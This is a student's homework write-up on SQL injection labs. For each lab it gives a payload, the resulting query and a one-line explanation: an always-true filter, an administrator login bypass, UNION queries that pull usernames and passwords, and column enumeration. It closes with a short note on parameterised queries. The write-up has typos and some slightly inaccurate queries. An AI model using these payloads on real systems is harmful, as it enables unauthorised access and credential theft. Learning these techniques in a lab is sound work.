# SQL Injection Homework

## Lab 1  Retrive hidden data

### Payload
Gifts' OR 1=1--
### SQL Query
SELECT * FROM products 
WHERE category = 'Gifts' OR 1=1-- AND released =1 
### Why did it work
OR 1=1 is always true, so the database return hidden products too. 

## Lab 2 Login bypass
### Payload
administrator'--
### SQL Query
SELECT * FROM users 
WHERE username = 'administrator'--' AND password = 'something random' 
### Why did it work
The -- ignore the password check. 

## Lab 3 UNION:retrieve data from other tables
### Payload
Lifestyle 'UNION SELECT username,password FROM users--
### SQL Query
SELECT * FROM products 
WHERE category= 'Lifestyle'
UNION SELECT  username,password FROM users--'
### Why it work
UNION SELECT gets username and passwords from another table 

## Lab 4 Determine the number of columns
### Payload
Lifestyle 'UNION SELECT NULL,NULL,NULL--
### SQL QUERY
SELECT * FROM products
WHERE category = 'Lifestyle'
UNION SELECT NULL,NULL,NULL--
### Why it work
The query has 3 columns so UNION SELECT needs 3 values

## Lab 5 Find a column containing text
### Payload
Lifestyle ' UNION SELECT NULL, 'dQp4jy' , NULL--
### SQL QUERY
SELECT * FROM products
WHERE category = 'Lifestyle'
UNION SELECT 
NULL, 'dQp4jy' , NULL--
### Why it work
column 2 accepts text

## Lab 6 Retrieve mutiple values in a single column
### Payload
Gifts' UNION SELECT NULL,username || ':' || passwors FROM users--
### SQL QUERY
SELECT NULL, username || ':' || password FROM users
### Why it work
UNION SELECT combines username and password into one column

## Lab 9 Now defend it
ORDER BY and column names cannot use $1.They need allowlist to prevent SQL injection. 
$1 prevents SQL injection by treating input as data not code. 





